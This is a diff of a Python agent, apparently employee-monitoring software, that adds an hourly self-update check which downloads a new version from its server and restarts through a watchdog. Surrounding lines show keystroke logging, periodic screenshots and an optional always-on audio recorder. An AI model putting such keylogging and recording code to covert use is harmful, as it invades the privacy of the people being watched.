@@ -32,9 +32,11 @@ from idle import get_idle_seconds
 from keylogger import KeystrokeAggregator
 from local_buffer import LocalBuffer
 from screenshot import capture_primary_jpeg
+from updater import check_and_apply_update
 
 AGENT_VERSION = "0.9.1"
 DIAGNOSTICS_INTERVAL_SEC = 3600  # раз в час
+UPDATE_CHECK_INTERVAL_SEC = 3600  # раз в час проверяем обновления
 BUFFER_DRAIN_BATCH = 20  # сколько накопленных запросов отправляем за один цикл
 
 PERIODIC_PERSONAL_SEC = int(os.environ.get("OM_SCREENSHOT_PERSONAL_SEC", "300"))  # 5 мин
@@ -334,6 +336,7 @@ def main() -> None:
         # стартовый снимок diagnostics
         upload_diagnostics(client, agent_id)
         last_diagnostics_mono = time.monotonic()
+        last_update_check_mono = time.monotonic()
 
         # Always-on рекордер: пишет голосовые сегменты весь рабочий день.
         # Включается через OM_ENABLE_ALWAYS_ON_AUDIO=1.
@@ -467,6 +470,13 @@ def main() -> None:
                 if time.monotonic() - last_diagnostics_mono >= DIAGNOSTICS_INTERVAL_SEC:
                     upload_diagnostics(client, agent_id)
                     last_diagnostics_mono = time.monotonic()
+
+                # проверка обновлений раз в час
+                if time.monotonic() - last_update_check_mono >= UPDATE_CHECK_INTERVAL_SEC:
+                    if check_and_apply_update(client, SERVER_URL, AGENT_VERSION):
+                        log.info("update applied — выхожу, watchdog перезапустит")
+                        return  # watchdog поднимет новую версию
+                    last_update_check_mono = time.monotonic()
 
                 if samples:
                     apps_summary = ", ".join(f"{s['app_name']}={s['duration_seconds']}s" for s in samples)
